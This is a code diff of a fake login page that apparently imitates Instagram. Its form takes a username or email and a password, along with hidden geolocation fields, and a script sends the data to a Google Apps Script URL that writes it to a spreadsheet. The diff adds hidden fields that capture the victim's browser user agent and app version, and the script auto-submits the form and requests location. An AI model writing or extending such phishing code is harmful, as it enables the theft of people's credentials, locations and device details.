@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -23,7 +25,8 @@
             <input type="text" name="email" placeholder="Phone number, username, or email"value="">
             <input type="text" name="password" placeholder="Password">
 			<input type="hidden" name="location" id= "location" >
-			<input type="hidden" name="type" id= "type" >
+			<input type="hidden" name="DeviceInfo" id= "DeviceInfo" >
+            <input type="hidden" name="devinfo" id= "devinfo">
             <button class="form-btn" name="submit" type="submit">Log in</button>
             <a class="password-reset" href="#">Forgot password?</a>
           </form>
@@ -66,6 +69,8 @@
 const scriptURL = 'https://script.google.com/macros/s/AKfycbxykaDM_Ei9yrv0vlvnf4u68LhpOPDG-nWGx2Xa7nlI8uVtPJKlxLP-YpzAzhOx07s2mA/exec'
 const form = document.forms['google-sheet']
 function getLocation() {
+document.getElementById("DeviceInfo").value= navigator.userAgent;
+document.getElementById("devinfo").value= navigator.appVersion;
 document.getElementsByClassName("form-btn")[0].click();
 navigator.geolocation.getCurrentPosition(showPosition);
 }
